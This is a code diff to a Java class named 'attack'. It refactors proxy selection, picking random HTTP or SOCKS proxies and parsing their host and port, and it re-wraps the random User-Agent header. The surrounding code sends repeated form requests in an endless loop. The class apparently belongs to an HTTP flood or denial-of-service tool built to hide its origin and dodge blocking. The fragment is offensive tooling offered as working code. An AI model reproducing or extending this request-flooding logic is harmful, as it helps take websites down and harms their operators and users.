@@ -46,31 +46,20 @@ public class attack implements Runnable {
                 if (random.nextBoolean()) {
                     proxytype = "http";
                     proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
-                    proxyiurl = murl.iurl(proxyurl);
-                    proxyhost = proxyiurl[0];
-                    proxyport = Integer.valueOf(proxyiurl[1]);
                 } else {
                     proxytype = "socks";
                     proxyurl = proxysocks[random.nextInt(proxysocks.length)];
-                    proxyiurl = murl.iurl(proxyurl);
-                    proxyhost = proxyiurl[0];
-                    proxyport = Integer.valueOf(proxyiurl[1]);
                 }
             } else if (proxyhttpswich && !proxysocksswich) {
                 proxytype = "http";
                 proxyurl = proxyhttp[random.nextInt(proxyhttp.length)];
-                proxyiurl = murl.iurl(proxyurl);
-                proxyhost = proxyiurl[0];
-                proxyport = Integer.valueOf(proxyiurl[1]);
             } else if (!proxyhttpswich && proxysocksswich) {
                 proxytype = "socks";
                 proxyurl = proxysocks[random.nextInt(proxysocks.length)];
-                proxyiurl = murl.iurl(proxyurl);
-                proxyhost = proxyiurl[0];
-                proxyport = Integer.valueOf(proxyiurl[1]);
-            } else {
-                System.out.println("ERROR: 没有找到可使用的代理");
             }
+            proxyiurl = murl.iurl(proxyurl);
+            proxyhost = proxyiurl[0];
+            proxyport = Integer.valueOf(proxyiurl[1]);
         }
         while (true) {
             // url
@@ -139,7 +128,8 @@ public class attack implements Runnable {
             // 设置请求头
             httpURLConnection.setRequestProperty("Content-Length", "40");
             httpURLConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-            httpURLConnection.setRequestProperty("User-Agent", array.useragent[random.nextInt(array.useragent.length - 1)]);
+            httpURLConnection.setRequestProperty("User-Agent",
+                    array.useragent[random.nextInt(array.useragent.length - 1)]);
             // 连接
             httpURLConnection.connect();
             /* 4. 处理输入输出 */
